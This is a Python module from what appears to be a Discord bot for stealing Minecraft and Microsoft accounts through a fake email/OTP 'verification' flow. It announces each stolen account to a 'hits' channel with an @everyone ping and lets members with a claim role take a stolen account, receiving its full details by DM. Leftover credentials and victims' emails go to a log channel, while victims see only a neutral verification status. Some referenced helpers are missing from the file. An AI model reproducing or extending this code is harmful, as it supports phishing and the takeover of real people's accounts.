"""Verification result posting (Components V2 cards).

Handles the final user-visible status for the embed/OTP verify flow and the
leftover credentials dump to the log channel.

Claim behavior (configured in config.json `claims`):
- If claims are enabled and the account is unclaimed, the public secured card is
  shown as a "New Hit! Secured in Xs" green card with the username/avatar, but
  None of the raw account fields are shown on that public card. The card includes
  a Claim button for the configured claim role.
- When the claim role user presses Claim, the claim is recorded in
  `account_claims` and the full secured account details are DM'd to the claimant.
- If the account is already claimed, the public card shows a claimed state instead
  of raw account fields.
"""

from __future__ import annotations

import json
import logging

import discord
from discord import AllowedMentions, Embed, Interaction, abc

from securing.account_filters import is_embed_verify_no_minecraft
from securing.build_embeds import build_account_embeds, public_secure_reason
from shared.send_logs import send_logs, build_log_embed
from shared.post_verification import after_verify
from ui import theme
from database.database import DBConnection
from ui.buttons.account_details import accountInfo
from ui.buttons.claim_button import ClaimButton, claimed_card


async def _send_claim_dm(
    *,
    user: discord.User | discord.Member,
    secured_account,
    mc_name: str,
) -> None:
    details = secured_account.get("details") if isinstance(secured_account, dict) else None
    hit_embed = secured_account.get("hit_embed") if isinstance(secured_account, dict) else None

    if hit_embed is None:
        await user.send(
            embed=Embed(
                title="Account secured",
                description="Account was secured, but the details embed was not available.",
                color=theme.GREEN,
            )
        )
        return

    try:
        await user.send(embed=hit_embed)
    except discord.Forbidden:
        log.info("claim DM failed — DMs disabled for %s", user.id)
        return

    if details and isinstance(details, dict):
        info_view = None
        try:
            info_view = accountInfo(details)
        except Exception:
            log.warning("accountInfo view build failed for claim DM", exc_info=True)
        if info_view is not None:
            try:
                await user.send(view=info_view)
            except discord.Forbidden:
                log.info(
                    "claim DM extras failed — DMs disabled for %s", user.id
                )


log = logging.getLogger("bot")


_NO_MC_TITLE = "Failed to verify"
_NO_MC_DESC = "You have to use an email linked to your minecraft account, please try again."


# ---------------------------------------------------------------------------
# User-facing cards
# ---------------------------------------------------------------------------


def _no_mc_card() -> discord.ui.DesignerView:
    return theme.fail_card(_NO_MC_TITLE, _NO_MC_DESC)


def _verify_fail_card(reason: str | None = None) -> discord.ui.DesignerView:
    description = (
        public_secure_reason(reason)
        or "We couldn't complete this right now. Please try again in a few minutes."
    )
    return theme.fail_card("Could not finish verification", description)


async def set_verify_ephemeral(interaction: Interaction, payload) -> None:
    """Keep verification on a single message (no log dumps).

    ``payload`` may be a :class:`discord.ui.DesignerView` (Components V2 card)
    or a classic :class:`discord.Embed`. A component/modal interaction edits the
    card in place so the user sees one evolving message instead of a stack.
    """
    is_card = isinstance(payload, discord.ui.DesignerView)
    if is_card:
        kwargs: dict = {"content": None, "embeds": [], "view": payload}
    else:
        kwargs = {"content": None, "embed": payload, "view": None}

    try:
        if interaction.message is not None and not interaction.response.is_done():
            await interaction.response.edit_message(**kwargs)
            return
        if interaction.response.is_done():
            await interaction.edit_original_response(**kwargs)
            return
        if is_card:
            await interaction.response.send_message(view=payload, ephemeral=True)
        else:
            await interaction.response.send_message(embed=payload, ephemeral=True)
        return
    except Exception:
        log.warning("edit verify message failed — trying followup", exc_info=True)

    try:
        if is_card:
            await interaction.followup.send(view=payload, ephemeral=True)
        else:
            await interaction.followup.send(embed=payload, ephemeral=True)
    except Exception:
        log.exception("could not send verify message")


def _cfg_claims_enabled() -> bool:
    try:
        with open("config/config.json", encoding="utf-8") as f:
            cfg = json.load(f)
    except Exception:
        return False
    claims = cfg.get("claims")
    if not isinstance(claims, dict):
        return False
    return bool(claims.get("enabled", True))


def _cfg_claim_role_id() -> int | None:
    try:
        with open("config/config.json", encoding="utf-8") as f:
            cfg = json.load(f)
    except Exception:
        return None
    claims = cfg.get("claims") or {}
    role_id = claims.get("claim_role_id")
    if not role_id:
        return None
    try:
        return int(str(role_id).strip())
    except (TypeError, ValueError):
        return None


def _can_user_claim(interaction: Interaction) -> tuple[bool, str | None]:
    claims_enabled = _cfg_claims_enabled()
    if not claims_enabled:
        return False, "Claims are disabled."

    role_id = _cfg_claim_role_id()
    if role_id is None:
        return False, "Claim role is not configured."

    guild = interaction.guild
    if guild is None:
        return False, "Claims only work in a server."

    role = guild.get_role(role_id)
    if role is None:
        return False, "The configured claim role does not exist in this server."

    if role not in interaction.user.roles:
        return False, "You do not have the claim role."

    return True, None


def _build_public_hit_card(
    *,
    username: str,
    secured_account,
    details,
    hit_embed: Embed | None,
    mc_name: str,
) -> discord.ui.DesignerView:
    """Public secured card. Never shows the account name or raw credentials.

    Unclaimed:
        "An account has been secured" + a Claim button.
    Claimed:
        same heading, a "Claimed by X" line, and a disabled Claimed button.
    """
    claim_cfg = {}
    try:
        with open("config/config.json", encoding="utf-8") as f:
            claim_cfg = json.load(f).get("claims") or {}
    except Exception:
        claim_cfg = {}

    claims_enabled = bool(claim_cfg.get("enabled", True))

    account_id = ""
    if isinstance(secured_account, dict):
        account_id = (
            secured_account.get("account_id")
            or (secured_account.get("details") or {}).get("account_id")
            or ""
        )

    claimed_by = None
    claimed_by_id = None
    if claims_enabled and account_id:
        try:
            claim = DBConnection().get_claim(account_id)
            if claim and claim.get("claimed_by_user_id"):
                claimed_by = claim.get("claimed_by_username")
                claimed_by_id = claim.get("claimed_by_user_id")
        except Exception:
            log.warning("claim lookup failed for public card", exc_info=True)

    if claimed_by:
        return claimed_card(
            username=username, claimed_by=claimed_by, claimed_by_id=claimed_by_id
        )

    lines = ["## An account has been secured", ""]
    if claims_enabled:
        lines.append("Click the **Claim** button below to claim it.")
    else:
        lines.append("Claims are disabled for this server.")

    buttons: list[discord.ui.Button] = []
    if claims_enabled:
        view = ClaimButton(
            account_id=account_id,
            username=username,
            user_id=None,
            username_at_action=username,
            already_claimed_by_user_id=None,
            already_claimed_by_username=None,
        )
        # Components V2 ActionRow rejects buttons that still carry a classic
        # ``row=`` value (pycord raises ValueError on add_item), so strip it.
        for item in view.children:
            item.row = None
            buttons.append(item)

    components: list[discord.ui.ViewItem] = [
        discord.ui.Section(
            discord.ui.TextDisplay("\n".join(lines)),
            accessory=discord.ui.Thumbnail(theme.avatar_url(username)),
        )
    ]
    if buttons:
        components.append(discord.ui.ActionRow(*buttons))
    return discord.ui.DesignerView(
        discord.ui.Container(*components, colour=theme.GREEN),
        timeout=None,
    )


def _is_failed(secured_account) -> bool:
    if not isinstance(secured_account, dict):
        return False
    return bool(secured_account.get("failed"))


async def _notify_user_no_minecraft(interaction: Interaction) -> None:
    await set_verify_ephemeral(interaction, _no_mc_card())


async def resolve_hits_channel(client) -> abc.Messageable | None:
    """``discord.accounts_channel`` from config, or None when unreachable.

    A missing/deleted/unshared hits channel must only cost the hit post — not the
    verification that is already in flight.
    """
    try:
        config = json.load(open("config/config.json", "r"))
        channel_id = int(config["discord"]["accounts_channel"])
    except Exception:
        log.warning("accounts_channel missing from config — hits will not be posted", exc_info=True)
        return None

    try:
        return client.get_channel(channel_id) or await client.fetch_channel(channel_id)
    except Exception as exc:
        log.warning(
            "accounts_channel %s unreachable (%s: %s) — hits will not be posted",
            channel_id,
            exc.__class__.__name__,
            exc,
        )
        return None


async def _post_hit(hits_channel, *, always_log: bool = True, **kwargs) -> bool:
    """Send one hit message; never raises."""
    if hits_channel is None:
        if always_log:
            log.warning("no reachable hits channel — hit post skipped")
        return False
    try:
        await hits_channel.send(**kwargs)
        return True
    except Exception:
        log.warning("hit post failed", exc_info=True)
        return False




async def publish_embed_secure_result(
    *,
    interaction: Interaction,
    hits_channel: abc.Messageable | None,
    secured_account,
    email: str,
    username: str,
) -> bool:
    """Post OTP/authenticator embed-verify results. Returns True on real success.

    startSecuringAccount returns a truthy dict on login/filter failures
    (``failed=True``, often without ``details``). Treating that as success
    pinged @everyone then crashed on missing stats_embed.
    """
    name = str(username or "").strip()
    thumb = None
    if (
        name
        and " " not in name
        and 1 <= len(name) <= 16
        and name.lower() not in {"unknown", "no minecraft", "?", "n/a"}
        and all(c.isalnum() or c == "_" for c in name)
    ):
        thumb = f"https://visage.surgeplay.com/full/512/{name}?y=-40"

    if isinstance(secured_account, dict) and secured_account.get("embed_no_minecraft"):
        log.warning(
            "embed verify: %s has no Minecraft Java — skipping hit, asking for a Minecraft email",
            email,
        )
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | No Minecraft | Told user to use a Minecraft-linked email```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=ButtonOptions(interaction.user, interaction.user.id, username),
            email=email,
        )
        await _notify_user_no_minecraft(interaction)
        return False

    if _is_failed(secured_account):
        reason = "Failed to secure account"
        if isinstance(secured_account, dict):
            reason = str(secured_account.get("reason") or reason)
        short = public_secure_reason(reason)

        log.warning("embed secure failed for %s: %s", email, short)
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | Failed to secure | {short}```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=ButtonOptions(interaction.user, interaction.user.id, username),
            email=email,
        )
        # Leftover creds / Extra Info go to logs_channel only — never the hits room
        # and never as a second ephemeral (user keeps one fail status).
        if isinstance(secured_account, dict):
            await _send_leftover_to_logs(interaction, secured_account, email)
        await set_verify_ephemeral(interaction, _verify_fail_card(short))
        return False

    details = secured_account.get("details") if isinstance(secured_account, dict) else None
    hit_embed = secured_account.get("hit_embed") if isinstance(secured_account, dict) else None
    stats_embed = details.get("stats_embed") if isinstance(details, dict) else None
    no_mc = is_embed_verify_no_minecraft(secured_account)

    if no_mc:
        log.warning(
            "embed verify: %s has no Minecraft Java — skipping hit, asking for a Minecraft email",
            email,
        )
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | No Minecraft | Told user to use a Minecraft-linked email```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=ButtonOptions(interaction.user, interaction.user.id, username),
            email=email,
        )
        await _notify_user_no_minecraft(interaction)
        return False

    mc = secured_account.get("minecraft") if isinstance(secured_account, dict) else {}
    mc_name = mc.get("name") or "No Minecraft"

    claims_enabled = _cfg_claims_enabled()
    public_card = _build_public_hit_card(
        username=username,
        secured_account=secured_account,
        details=details,
        hit_embed=hit_embed,
        mc_name=mc_name,
    )

    if claims_enabled:
        # Claims mode: an @everyone ping so the room knows there is something to
        # claim, then the claim card itself. No stats embed and no credential
        # embed — the details are DM'd to whoever presses Claim.
        await _post_hit(
            hits_channel,
            content="@everyone **An account has been secured - press Claim to claim it!**",
            allowed_mentions=AllowedMentions(everyone=True, roles=False, users=False),
        )
        await _post_hit(hits_channel, view=public_card)
    else:
        await _post_hit(
            hits_channel,
            content="@everyone **Successfully secured an account**",
            allowed_mentions=AllowedMentions(everyone=True, roles=False, users=False),
        )
        if stats_embed is not None:
            await _post_hit(hits_channel, embed=stats_embed, always_log=False)
        await _post_hit(
            hits_channel, embed=hit_embed, view=public_card, always_log=False
        )

    await send_logs(
        interaction.client,
        Embed(
            title="New Account Secured",
            description=f"**{mc_name}** has been successfully secured.",
            color=0xFF9E45,
        ).set_thumbnail(url=f"https://mc-heads.net/avatar/{mc_name}/128"),
        email=email,
    )

    # Send the full secured account details to the claimant via DM when they
    # press Claim. The public card above intentionally hides the raw fields.
    try:
        db = DBConnection()
        account_id = None
        if isinstance(secured_account, dict):
            details = secured_account.get("details") or {}
            if isinstance(details, dict):
                account_id = details.get("account_id") or secured_account.get("account_id")
        if account_id:
            claim = db.get_claim(account_id)
            if claim and claim.get("claimed_by_user_id"):
                target = None
                try:
                    target = await interaction.client.fetch_user(int(claim["claimed_by_user_id"]))
                except Exception:
                    log.warning("claim DM lookup failed for account %s", account_id, exc_info=True)
                if target is not None:
                    await _send_claim_dm(user=target, secured_account=secured_account, mc_name=mc_name)
    except Exception:
        log.warning("claim DM send failed", exc_info=True)

    return True
